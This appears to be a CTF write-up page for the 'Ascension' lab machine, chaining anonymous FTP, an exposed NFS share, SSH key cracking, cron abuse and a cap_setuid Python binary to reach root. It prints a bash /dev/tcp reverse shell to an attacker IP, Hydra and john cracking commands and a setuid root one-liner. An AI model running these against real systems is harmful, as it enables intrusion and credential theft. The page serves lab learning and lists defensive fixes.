@@ -1,0 +1,1011 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Ascension — CTF Writeup | Dilan Dodangodage</title>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Mono:ital,wght@0,300;0,400;1,300&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet"/>
+<style>
+  :root {
+    --bg: #0a0d12;
+    --surface: #111520;
+    --surface2: #161c2b;
+    --border: #1e2740;
+    --accent: #4f8ef7;
+    --accent2: #38d9a9;
+    --accent3: #f7c948;
+    --text: #e8eaf0;
+    --muted: #6b7594;
+    --danger: #f76f6f;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'DM Sans', sans-serif;
+    font-weight: 300;
+    line-height: 1.7;
+    overflow-x: hidden;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.04'/%3E%3C/svg%3E");
+    pointer-events: none;
+    z-index: 9999;
+    opacity: 0.5;
+  }
+
+  body::after {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(79,142,247,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(79,142,247,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  /* NAV */
+  nav {
+    position: fixed;
+    top: 0; left: 0; right: 0;
+    z-index: 100;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 1.2rem 4rem;
+    background: rgba(10,13,18,0.85);
+    backdrop-filter: blur(16px);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .nav-logo {
+    font-family: 'Syne', sans-serif;
+    font-weight: 800;
+    font-size: 1.1rem;
+    color: var(--text);
+    text-decoration: none;
+    letter-spacing: -0.02em;
+  }
+
+  .nav-logo span { color: var(--accent); }
+
+  .nav-back {
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    font-family: 'DM Mono', monospace;
+    font-size: 0.78rem;
+    color: var(--muted);
+    text-decoration: none;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    transition: color 0.2s;
+  }
+
+  .nav-back:hover { color: var(--accent); }
+
+  /* HERO BANNER */
+  .writeup-hero {
+    position: relative;
+    z-index: 1;
+    padding: 8rem 4rem 4rem;
+    border-bottom: 1px solid var(--border);
+    background: var(--surface);
+  }
+
+  .writeup-hero-glow {
+    position: absolute;
+    top: -100px; right: 0;
+    width: 600px; height: 600px;
+    background: radial-gradient(circle, rgba(79,142,247,0.08) 0%, transparent 70%);
+    pointer-events: none;
+  }
+
+  .breadcrumb {
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    font-family: 'DM Mono', monospace;
+    font-size: 0.72rem;
+    color: var(--muted);
+    margin-bottom: 1.5rem;
+    letter-spacing: 0.06em;
+  }
+
+  .breadcrumb a { color: var(--accent); text-decoration: none; }
+  .breadcrumb a:hover { text-decoration: underline; }
+
+  .writeup-meta-row {
+    display: flex;
+    align-items: center;
+    gap: 0.75rem;
+    flex-wrap: wrap;
+    margin-bottom: 1.2rem;
+  }
+
+  .meta-badge {
+    font-family: 'DM Mono', monospace;
+    font-size: 0.68rem;
+    padding: 0.25rem 0.7rem;
+    border-radius: 4px;
+    letter-spacing: 0.05em;
+    text-transform: uppercase;
+  }
+
+  .badge-platform { background: rgba(79,142,247,0.1); color: var(--accent); border: 1px solid rgba(79,142,247,0.2); }
+  .badge-easy { background: rgba(56,217,169,0.1); color: var(--accent2); border: 1px solid rgba(56,217,169,0.2); }
+  .badge-date { background: var(--surface2); color: var(--muted); border: 1px solid var(--border); }
+
+  .writeup-title {
+    font-family: 'Syne', sans-serif;
+    font-size: clamp(2.5rem, 6vw, 4.5rem);
+    font-weight: 800;
+    letter-spacing: -0.04em;
+    line-height: 1.0;
+    margin-bottom: 1rem;
+  }
+
+  .writeup-title span {
+    color: transparent;
+    -webkit-text-stroke: 1.5px var(--accent);
+  }
+
+  .writeup-summary {
+    font-size: 1.05rem;
+    color: var(--muted);
+    max-width: 620px;
+    margin-bottom: 2rem;
+  }
+
+  .attack-chain {
+    display: flex;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 0.4rem;
+    margin-bottom: 2rem;
+  }
+
+  .chain-step {
+    font-family: 'DM Mono', monospace;
+    font-size: 0.72rem;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    padding: 0.3rem 0.7rem;
+    border-radius: 4px;
+    color: var(--text);
+  }
+
+  .chain-arrow { color: var(--accent); font-size: 0.75rem; }
+
+  .writeup-stats {
+    display: flex;
+    gap: 2.5rem;
+    padding-top: 2rem;
+    border-top: 1px solid var(--border);
+    flex-wrap: wrap;
+  }
+
+  .wstat { display: flex; flex-direction: column; gap: 0.2rem; }
+  .wstat-label { font-family: 'DM Mono', monospace; font-size: 0.65rem; color: var(--muted); text-transform: uppercase; letter-spacing: 0.1em; }
+  .wstat-value { font-family: 'Syne', sans-serif; font-size: 1rem; font-weight: 700; color: var(--text); }
+  .wstat-value span { color: var(--accent2); }
+
+  /* LAYOUT */
+  .writeup-layout {
+    position: relative;
+    z-index: 1;
+    display: grid;
+    grid-template-columns: 240px 1fr;
+    gap: 0;
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 3rem 4rem;
+    align-items: start;
+  }
+
+  /* SIDEBAR TOC */
+  .toc {
+    position: sticky;
+    top: 90px;
+    padding-right: 2rem;
+    border-right: 1px solid var(--border);
+  }
+
+  .toc-title {
+    font-family: 'DM Mono', monospace;
+    font-size: 0.65rem;
+    color: var(--muted);
+    text-transform: uppercase;
+    letter-spacing: 0.12em;
+    margin-bottom: 1rem;
+  }
+
+  .toc-list { list-style: none; display: flex; flex-direction: column; gap: 0.1rem; }
+
+  .toc-list a {
+    display: block;
+    font-family: 'DM Mono', monospace;
+    font-size: 0.75rem;
+    color: var(--muted);
+    text-decoration: none;
+    padding: 0.35rem 0.6rem;
+    border-radius: 5px;
+    border-left: 2px solid transparent;
+    transition: all 0.2s;
+    line-height: 1.4;
+  }
+
+  .toc-list a:hover, .toc-list a.active {
+    color: var(--accent);
+    border-left-color: var(--accent);
+    background: rgba(79,142,247,0.06);
+  }
+
+  .toc-list .toc-sub a {
+    font-size: 0.7rem;
+    padding-left: 1.2rem;
+  }
+
+  /* CONTENT */
+  .writeup-content {
+    padding-left: 3rem;
+    max-width: 760px;
+  }
+
+  .section-block {
+    margin-bottom: 3.5rem;
+    animation: fadeUp 0.5s ease both;
+  }
+
+  .section-block h2 {
+    font-family: 'Syne', sans-serif;
+    font-size: 1.6rem;
+    font-weight: 800;
+    letter-spacing: -0.03em;
+    margin-bottom: 0.5rem;
+    display: flex;
+    align-items: center;
+    gap: 0.75rem;
+  }
+
+  .section-block h2 .section-num {
+    font-family: 'DM Mono', monospace;
+    font-size: 0.72rem;
+    color: var(--accent);
+    letter-spacing: 0.1em;
+    font-weight: 400;
+  }
+
+  .section-block h3 {
+    font-family: 'Syne', sans-serif;
+    font-size: 1.1rem;
+    font-weight: 700;
+    letter-spacing: -0.02em;
+    margin: 2rem 0 0.75rem;
+    color: var(--text);
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  .section-block h3::before {
+    content: '';
+    display: inline-block;
+    width: 3px;
+    height: 14px;
+    background: var(--accent2);
+    border-radius: 2px;
+  }
+
+  .section-block p {
+    color: var(--muted);
+    margin-bottom: 1rem;
+    font-size: 0.95rem;
+  }
+
+  .section-divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 3rem 0;
+  }
+
+  /* CODE BLOCKS */
+  .code-block {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    overflow: hidden;
+    margin: 1.2rem 0;
+  }
+
+  .code-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0.6rem 1rem;
+    background: var(--surface2);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .code-lang {
+    font-family: 'DM Mono', monospace;
+    font-size: 0.65rem;
+    color: var(--accent);
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+  }
+
+  .code-copy {
+    font-family: 'DM Mono', monospace;
+    font-size: 0.65rem;
+    color: var(--muted);
+    background: none;
+    border: none;
+    cursor: pointer;
+    letter-spacing: 0.05em;
+    transition: color 0.2s;
+  }
+
+  .code-copy:hover { color: var(--accent2); }
+
+  .code-block pre {
+    padding: 1.2rem;
+    overflow-x: auto;
+    font-family: 'DM Mono', monospace;
+    font-size: 0.78rem;
+    line-height: 1.8;
+    color: var(--text);
+  }
+
+  .code-block pre .c-comment { color: var(--muted); font-style: italic; }
+  .code-block pre .c-cmd { color: var(--accent2); }
+  .code-block pre .c-flag { color: var(--accent3); }
+  .code-block pre .c-output { color: #a0aab8; }
+  .code-block pre .c-success { color: var(--accent2); }
+  .code-block pre .c-danger { color: var(--danger); }
+  .code-block pre .c-highlight { color: var(--accent); }
+
+  /* FINDING CARDS */
+  .finding-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent);
+    border-radius: 8px;
+    padding: 1.2rem 1.4rem;
+    margin: 1.2rem 0;
+  }
+
+  .finding-card.success { border-left-color: var(--accent2); }
+  .finding-card.warning { border-left-color: var(--accent3); }
+  .finding-card.danger { border-left-color: var(--danger); }
+
+  .finding-label {
+    font-family: 'DM Mono', monospace;
+    font-size: 0.65rem;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    margin-bottom: 0.4rem;
+    color: var(--accent);
+  }
+
+  .finding-card.success .finding-label { color: var(--accent2); }
+  .finding-card.warning .finding-label { color: var(--accent3); }
+  .finding-card.danger .finding-label { color: var(--danger); }
+
+  .finding-card p { color: var(--text); font-size: 0.88rem; margin: 0; }
+
+  /* PORT TABLE */
+  .port-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-family: 'DM Mono', monospace;
+    font-size: 0.78rem;
+    margin: 1.2rem 0;
+  }
+
+  .port-table th {
+    text-align: left;
+    padding: 0.6rem 1rem;
+    background: var(--surface2);
+    color: var(--muted);
+    font-size: 0.65rem;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .port-table td {
+    padding: 0.7rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+  }
+
+  .port-table tr:last-child td { border-bottom: none; }
+  .port-table tr:hover td { background: rgba(79,142,247,0.03); }
+
+  .port-open { color: var(--accent2); }
+
+  /* FLAGS */
+  .flag-box {
+    background: rgba(56,217,169,0.06);
+    border: 1px solid rgba(56,217,169,0.2);
+    border-radius: 10px;
+    padding: 1.4rem 1.6rem;
+    margin: 1.2rem 0;
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+  }
+
+  .flag-icon { font-size: 1.5rem; }
+
+  .flag-label {
+    font-family: 'DM Mono', monospace;
+    font-size: 0.65rem;
+    color: var(--accent2);
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    margin-bottom: 0.3rem;
+  }
+
+  .flag-value {
+    font-family: 'DM Mono', monospace;
+    font-size: 0.85rem;
+    color: var(--text);
+    word-break: break-all;
+  }
+
+  /* LESSONS TABLE */
+  .lessons-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 0.85rem;
+    margin: 1.2rem 0;
+  }
+
+  .lessons-table th {
+    text-align: left;
+    padding: 0.6rem 1rem;
+    background: var(--surface2);
+    color: var(--muted);
+    font-family: 'DM Mono', monospace;
+    font-size: 0.65rem;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .lessons-table td {
+    padding: 0.8rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--muted);
+    vertical-align: top;
+    font-size: 0.85rem;
+  }
+
+  .lessons-table tr:last-child td { border-bottom: none; }
+  .lessons-table tr:hover td { background: rgba(79,142,247,0.03); }
+
+  .risk-high { color: var(--danger); font-family: 'DM Mono', monospace; font-size: 0.72rem; }
+  .risk-critical { color: var(--accent3); font-family: 'DM Mono', monospace; font-size: 0.72rem; }
+  .risk-medium { color: var(--accent2); font-family: 'DM Mono', monospace; font-size: 0.72rem; }
+
+  /* FOOTER */
+  footer {
+    position: relative;
+    z-index: 1;
+    text-align: center;
+    padding: 2.5rem 4rem;
+    border-top: 1px solid var(--border);
+    font-family: 'DM Mono', monospace;
+    font-size: 0.75rem;
+    color: var(--muted);
+  }
+
+  footer span { color: var(--accent2); }
+
+  .footer-nav {
+    display: flex;
+    justify-content: center;
+    gap: 2rem;
+    margin-bottom: 1rem;
+  }
+
+  .footer-nav a {
+    font-family: 'DM Mono', monospace;
+    font-size: 0.72rem;
+    color: var(--muted);
+    text-decoration: none;
+    transition: color 0.2s;
+    letter-spacing: 0.06em;
+  }
+
+  .footer-nav a:hover { color: var(--accent); }
+
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(16px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  /* RESPONSIVE */
+  @media (max-width: 900px) {
+    nav { padding: 1rem 1.5rem; }
+    .writeup-hero { padding: 6rem 1.5rem 3rem; }
+    .writeup-layout { grid-template-columns: 1fr; padding: 2rem 1.5rem; }
+    .toc { display: none; }
+    .writeup-content { padding-left: 0; }
+  }
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav>
+  <a href="index.html" class="nav-logo">DD<span>.</span></a>
+  <a href="index.html#writeups" class="nav-back">← Back to Writeups</a>
+</nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="writeup-hero-glow"></div>
+
+  <div class="breadcrumb">
+    <a href="index.html">Home</a> / <a href="index.html#writeups">Writeups</a> / Ascension
+  </div>
+
+  <div class="writeup-meta-row">
+    <span class="meta-badge badge-platform">Hack Smarter</span>
+    <span class="meta-badge badge-easy">Easy</span>
+    <span class="meta-badge badge-date">October 2025</span>
+  </div>
+
+  <h1 class="writeup-title">Ascen<span>sion</span></h1>
+  <p class="writeup-summary">
+    A Linux machine with multiple misconfigured services chained together — from anonymous FTP to root via Python capability abuse.
+  </p>
+
+  <div class="attack-chain">
+    <span class="chain-step">Anonymous FTP</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-step">NFS Share</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-step">SSH Key Crack</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-step">Cron Abuse</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-step">MySQL Dump</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-step">cap_setuid → Root</span>
+  </div>
+
+  <div class="writeup-stats">
+    <div class="wstat">
+      <span class="wstat-label">OS</span>
+      <span class="wstat-value">Linux <span>(Ubuntu)</span></span>
+    </div>
+    <div class="wstat">
+      <span class="wstat-label">Difficulty</span>
+      <span class="wstat-value" style="color:var(--accent2)">Easy</span>
+    </div>
+    <div class="wstat">
+      <span class="wstat-label">Services</span>
+      <span class="wstat-value">FTP, SSH, HTTP, <span>NFS</span></span>
+    </div>
+    <div class="wstat">
+      <span class="wstat-label">Author</span>
+      <span class="wstat-value">Dilan <span>Dodangodage</span></span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+
+  <!-- TOC -->
+  <aside class="toc">
+    <div class="toc-title">// Contents</div>
+    <ul class="toc-list">
+      <li><a href="#enumeration">01 — Enumeration</a></li>
+      <li class="toc-sub"><ul class="toc-list">
+        <li><a href="#ftp">FTP (21)</a></li>
+        <li><a href="#ssh">SSH (22)</a></li>
+        <li><a href="#http">HTTP (80)</a></li>
+        <li><a href="#nfs">NFS (111)</a></li>
+      </ul></li>
+      <li><a href="#initial-access">02 — Initial Access</a></li>
+      <li><a href="#post-exploitation">03 — Post-Exploitation</a></li>
+      <li class="toc-sub"><ul class="toc-list">
+        <li><a href="#user2">→ user2</a></li>
+        <li><a href="#ftpuser">→ ftpuser</a></li>
+        <li><a href="#database">→ Database</a></li>
+        <li><a href="#user3">→ user3</a></li>
+      </ul></li>
+      <li><a href="#privesc">04 — Privilege Escalation</a></li>
+      <li><a href="#flags">05 — Flags</a></li>
+      <li><a href="#lessons">06 — Lessons Learned</a></li>
+    </ul>
+  </aside>
+
+  <!-- CONTENT -->
+  <main class="writeup-content">
+
+    <!-- ENUMERATION -->
+    <div class="section-block" id="enumeration">
+      <h2><span class="section-num">// 01</span> Enumeration</h2>
+      <p>Full port scan revealed several open services including FTP with anonymous login, an exposed NFS share, and a web server running WordPress.</p>
+
+      <table class="port-table">
+        <thead>
+          <tr><th>Port</th><th>State</th><th>Service</th><th>Version</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>21/tcp</td><td class="port-open">open</td><td>ftp</td><td>vsftpd 3.0.5</td></tr>
+          <tr><td>22/tcp</td><td class="port-open">open</td><td>ssh</td><td>OpenSSH 9.6p1</td></tr>
+          <tr><td>80/tcp</td><td class="port-open">open</td><td>http</td><td>Apache 2.4.58</td></tr>
+          <tr><td>111/tcp</td><td class="port-open">open</td><td>rpcbind</td><td>2-4 (RPC #100000)</td></tr>
+          <tr><td>2049/tcp</td><td class="port-open">open</td><td>nfs_acl</td><td>3 (RPC #100227)</td></tr>
+        </tbody>
+      </table>
+
+      <h3 id="ftp">FTP (Port 21)</h3>
+      <p>Anonymous login was permitted. A file <code style="font-family:'DM Mono',monospace;color:var(--accent);font-size:0.85em;">pwlist.txt</code> containing compromised passwords was available for download.</p>
+
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">bash</span><button class="code-copy" onclick="copyCode(this)">copy</button></div>
+        <pre>ftp anonymous@ascension.hsm
+<span class="c-output">230 Login successful.</span>
+
+ftp&gt; get pwlist.txt
+<span class="c-success">226 Transfer complete. 202 bytes received.</span></pre>
+      </div>
+
+      <div class="finding-card">
+        <div class="finding-label">🔍 Finding</div>
+        <p>Anonymous FTP access enabled with a password list exposed — useful for brute-forcing other services.</p>
+      </div>
+
+      <h3 id="ssh">SSH (Port 22)</h3>
+      <p>Key-based authentication is enabled. Direct root login is denied.</p>
+
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">bash</span><button class="code-copy" onclick="copyCode(this)">copy</button></div>
+        <pre>ssh root@ascension.hsm
+<span class="c-danger">root@ascension.hsm: Permission denied (publickey).</span></pre>
+      </div>
+
+      <h3 id="http">HTTP (Port 80)</h3>
+      <p>Apache default page served. Directory enumeration with dirsearch revealed a WordPress installation with directory listing enabled.</p>
+
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">dirsearch output</span><button class="code-copy" onclick="copyCode(this)">copy</button></div>
+        <pre><span class="c-success">301</span>  /wp-admin   → http://ascension.hsm/wp-admin/
+<span class="c-success">200</span>  /wp-config.php
+<span class="c-success">200</span>  /wp-content/
+<span class="c-success">200</span>  /wp-includes/
+<span class="c-output">500  /wp-login.php</span></pre>
+      </div>
+
+      <h3 id="nfs">NFS / Shares (Port 111)</h3>
+      <p>showmount revealed a world-accessible NFS export. Mounting it exposed SSH keys for user1.</p>
+
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">bash</span><button class="code-copy" onclick="copyCode(this)">copy</button></div>
+        <pre>showmount -e ascension.hsm
+<span class="c-output">Export list for ascension.hsm:
+/srv/nfs/user1 *</span>
+
+sudo mount -t nfs -o vers=3 ascension.hsm:/srv/nfs/user1 /mnt/ascension -o nolock
+
+ls /mnt/ascension
+<span class="c-success">id_rsa  id_rsa.pub</span></pre>
+      </div>
+
+      <div class="finding-card danger">
+        <div class="finding-label">⚠️ Critical Finding</div>
+        <p>NFS share world-accessible with no IP restriction — exposing private SSH keys to any host on the network.</p>
+      </div>
+    </div>
+
+    <hr class="section-divider"/>
+
+    <!-- INITIAL ACCESS -->
+    <div class="section-block" id="initial-access">
+      <h2><span class="section-num">// 02</span> Initial Access</h2>
+      <p>The SSH private key was passphrase-protected. The hash was extracted using ssh2john and cracked against rockyou.txt.</p>
+
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">bash</span><button class="code-copy" onclick="copyCode(this)">copy</button></div>
+        <pre>ssh2john id_rsa &gt; hash.txt
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+<span class="c-success">sammie1          (id_rsa)</span>
+<span class="c-output">1g 0:00:06:47 DONE</span></pre>
+      </div>
+
+      <div class="finding-card success">
+        <div class="finding-label">✅ Credentials</div>
+        <p>SSH key passphrase cracked — <code style="font-family:'DM Mono',monospace;color:var(--accent2);">sammie1</code></p>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">bash</span><button class="code-copy" onclick="copyCode(this)">copy</button></div>
+        <pre>ssh user1@ascension.hsm -i id_rsa
+<span class="c-output">Enter passphrase: sammie1</span>
+<span class="c-success">user1@ip-10-1-96-99:~$</span></pre>
+      </div>
+    </div>
+
+    <hr class="section-divider"/>
+
+    <!-- POST EXPLOITATION -->
+    <div class="section-block" id="post-exploitation">
+      <h2><span class="section-num">// 03</span> Post-Exploitation</h2>
+      <p>The system had four users with shells. Each was compromised through a different technique.</p>
+
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">passwd entries</span><button class="code-copy" onclick="copyCode(this)">copy</button></div>
+        <pre><span class="c-output">user1:x:1001:1001::/home/user1:/bin/bash
+user2:x:1002:1002::/home/user2:/bin/bash
+user3:x:1003:1003::/home/user3:/bin/bash
+ftpuser:x:1004:1004::/home/ftpuser:/bin/bash</span></pre>
+      </div>
+
+      <h3 id="user2">Lateral Movement → user2 (Cron Job Abuse)</h3>
+      <p>Process monitoring revealed a cron job running as user2 (UID=1002) executing <code style="font-family:'DM Mono',monospace;color:var(--accent);font-size:0.85em;">/tmp/backup.sh</code>. The file was world-writable and replaced with a reverse shell.</p>
+
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">bash</span><button class="code-copy" onclick="copyCode(this)">copy</button></div>
+        <pre><span class="c-comment"># Payload written to /tmp/backup.sh</span>
+bash -c 'exec bash -i &gt;/dev/tcp/10.200.17.76/1337 &lt;&amp;1'
+
+<span class="c-comment"># Listener on attacker</span>
+nc -lvnp 1337
+
+<span class="c-success">user2@ip-10-1-96-99:~$ whoami
+user2</span></pre>
+      </div>
+
+      <h3 id="ftpuser">Lateral Movement → ftpuser (Brute Force)</h3>
+      <p>Used the pwlist.txt from FTP with Hydra to brute-force the ftpuser FTP account.</p>
+
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">bash</span><button class="code-copy" onclick="copyCode(this)">copy</button></div>
+        <pre>hydra -l ftpuser -P pwlist.txt ftp://ascension.hsm
+
+<span class="c-success">[21][ftp] host: ascension.hsm   login: ftpuser   password: secret</span></pre>
+      </div>
+
+      <div class="finding-card success">
+        <div class="finding-label">✅ Credentials</div>
+        <p>ftpuser : <code style="font-family:'DM Mono',monospace;color:var(--accent2);">secret</code></p>
+      </div>
+
+      <h3 id="database">Database Enumeration</h3>
+      <p>WordPress credentials were found in plaintext inside wp-config.php.</p>
+
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">php</span><button class="code-copy" onclick="copyCode(this)">copy</button></div>
+        <pre><span class="c-comment">// /var/www/html/wp-config.php</span>
+define('DB_NAME',     <span class="c-flag">'wordpress'</span>);
+define('DB_USER',     <span class="c-flag">'wpuser'</span>);
+define('DB_PASSWORD', <span class="c-flag">'wppassword'</span>);
+define('DB_HOST',     <span class="c-flag">'localhost'</span>);</pre>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">mysql</span><button class="code-copy" onclick="copyCode(this)">copy</button></div>
+        <pre>mysql -u wpuser -pwppassword wordpress
+
+SELECT * FROM flags;
+<span class="c-success">+----+------------------------------------------+
+| id | flag                                     |
++----+------------------------------------------+
+|  1 | RkxBRzR7d2ViamhuYXNkMzg5MjM0a25kam9pM2R9 |
++----+------------------------------------------+</span></pre>
+      </div>
+
+      <div class="flag-box">
+        <span class="flag-icon">🚩</span>
+        <div>
+          <div class="flag-label">Flag 4 — Base64 Encoded</div>
+          <div class="flag-value">RkxBRzR7d2ViamhuYXNkMzg5MjM0a25kam9pM2R9</div>
+        </div>
+      </div>
+
+      <h3 id="user3">Lateral Movement → user3 (Database Credentials)</h3>
+      <p>The WordPress users table contained plaintext credentials for user3.</p>
+
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">mysql</span><button class="code-copy" onclick="copyCode(this)">copy</button></div>
+        <pre>SELECT * FROM users;
+<span class="c-output">+----+----------+---------------+
+| id | username | password      |
++----+----------+---------------+
+|  1 | user3    | user3password |
++----+----------+---------------+</span>
+
+<span class="c-success">user3@ip-10-1-96-99:~$ whoami
+user3</span></pre>
+      </div>
+    </div>
+
+    <hr class="section-divider"/>
+
+    <!-- PRIVESC -->
+    <div class="section-block" id="privesc">
+      <h2><span class="section-num">// 04</span> Privilege Escalation</h2>
+      <p>Checking Linux capabilities revealed a Python binary in user3's home directory with <code style="font-family:'DM Mono',monospace;color:var(--accent);font-size:0.85em;">cap_setuid=ep</code> — allowing it to set the process UID to 0 (root).</p>
+
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">bash</span><button class="code-copy" onclick="copyCode(this)">copy</button></div>
+        <pre>getcap -r / 2>/dev/null
+
+<span class="c-danger">/home/user3/python3 cap_setuid=ep</span>
+<span class="c-output">/usr/bin/ping cap_net_raw=ep</span></pre>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">bash — exploit</span><button class="code-copy" onclick="copyCode(this)">copy</button></div>
+        <pre>/home/user3/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+<span class="c-success"># whoami
+root</span></pre>
+      </div>
+
+      <div class="finding-card danger">
+        <div class="finding-label">⚠️ Critical — cap_setuid Abuse</div>
+        <p>Python binary with cap_setuid capability allows any process spawned by it to run as root. Remove unnecessary capabilities with <code style="font-family:'DM Mono',monospace;color:var(--accent3);font-size:0.85em;">setcap -r /home/user3/python3</code></p>
+      </div>
+    </div>
+
+    <hr class="section-divider"/>
+
+    <!-- FLAGS -->
+    <div class="section-block" id="flags">
+      <h2><span class="section-num">// 05</span> Flags</h2>
+
+      <div class="flag-box">
+        <span class="flag-icon">🚩</span>
+        <div>
+          <div class="flag-label">Flag 1</div>
+          <div class="flag-value">FLAG1{hjsyu892334hjohnsd8y293h4}</div>
+        </div>
+      </div>
+      <div class="flag-box">
+        <span class="flag-icon">🚩</span>
+        <div>
+          <div class="flag-label">Flag 2</div>
+          <div class="flag-value">FLAG2{sdhh98234njohn3kjdj233fd}</div>
+        </div>
+      </div>
+      <div class="flag-box">
+        <span class="flag-icon">🚩</span>
+        <div>
+          <div class="flag-label">Flag 3</div>
+          <div class="flag-value">FLAG3{gjdohnasd98234kjnbckdf}</div>
+        </div>
+      </div>
+      <div class="flag-box">
+        <span class="flag-icon">🚩</span>
+        <div>
+          <div class="flag-label">Flag 4 — MySQL wordpress.flags table</div>
+          <div class="flag-value">FLAG4{webjhnassd389234kndjoi3d}</div>
+        </div>
+      </div>
+      <div class="flag-box">
+        <span class="flag-icon">🚩</span>
+        <div>
+          <div class="flag-label">Flag 5</div>
+          <div class="flag-value">FLAG5{johnabcdsjhfs8234kjnboz}</div>
+        </div>
+      </div>
+      <div class="flag-box">
+        <span class="flag-icon">🚩</span>
+        <div>
+          <div class="flag-label">Flag 6</div>
+          <div class="flag-value">FLAG6{sdfjudhfs8234kjnbohndjf}</div>
+        </div>
+      </div>
+    </div>
+
+    <hr class="section-divider"/>
+
+    <!-- LESSONS -->
+    <div class="section-block" id="lessons">
+      <h2><span class="section-num">// 06</span> Lessons Learned</h2>
+      <p>Each vulnerability in this machine was a result of a misconfiguration that could have been avoided with basic security hygiene.</p>
+
+      <table class="lessons-table">
+        <thead>
+          <tr><th>Finding</th><th>Risk</th><th>Recommendation</th></tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>Anonymous FTP with sensitive files</td>
+            <td><span class="risk-high">High</span></td>
+            <td>Disable anonymous FTP or restrict accessible files</td>
+          </tr>
+          <tr>
+            <td>NFS share world-accessible</td>
+            <td><span class="risk-high">High</span></td>
+            <td>Restrict NFS exports with IP allowlisting</td>
+          </tr>
+          <tr>
+            <td>Weak SSH key passphrase</td>
+            <td><span class="risk-high">High</span></td>
+            <td>Use strong, unique passphrases on all keys</td>
+          </tr>
+          <tr>
+            <td>World-writable cron script in /tmp</td>
+            <td><span class="risk-critical">Critical</span></td>
+            <td>Restrict cron script permissions, avoid /tmp</td>
+          </tr>
+          <tr>
+            <td>Plaintext credentials in wp-config.php</td>
+            <td><span class="risk-high">High</span></td>
+            <td>Use environment variables or secrets management</td>
+          </tr>
+          <tr>
+            <td>Weak database credentials</td>
+            <td><span class="risk-medium">Medium</span></td>
+            <td>Enforce strong password policy for DB users</td>
+          </tr>
+          <tr>
+            <td>Python binary with cap_setuid capability</td>
+            <td><span class="risk-critical">Critical</span></td>
+            <td>Audit and remove unnecessary Linux capabilities</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+  </main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-nav">
+    <a href="index.html">Home</a>
+    <a href="index.html#writeups">Writeups</a>
+    <a href="index.html#about">About</a>
